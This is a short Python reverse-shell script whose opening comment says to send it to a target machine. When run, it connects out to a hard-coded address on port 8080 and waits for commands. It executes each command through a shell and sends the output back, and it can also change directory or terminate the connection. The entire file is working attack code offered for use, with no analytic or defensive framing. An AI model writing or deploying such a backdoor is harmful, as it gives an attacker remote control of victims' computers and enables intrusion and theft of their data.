#send this python file to target machine

import socket
import subprocess
import os
import time

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.21.117.163", 8080))

    while True:
        command = s.recv(1024)
        command=command.decode('utf-8')
        print(command)
        if 'terminate' in command:
            s.close()
            break

        elif 'cd' in command:
            code, directory = command.split(' ')
            os.chdir(directory)
            a=('[+] CWD is : ' + os.getcwd())
            byt = a.encode('utf-8')
            s.sendall(byt)
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            x=CMD.stdout.read()
            y=CMD.stderr.read()
           
            s.sendall(x)
            s.sendall(y)
        
         
            

def main():
    connect()


main()
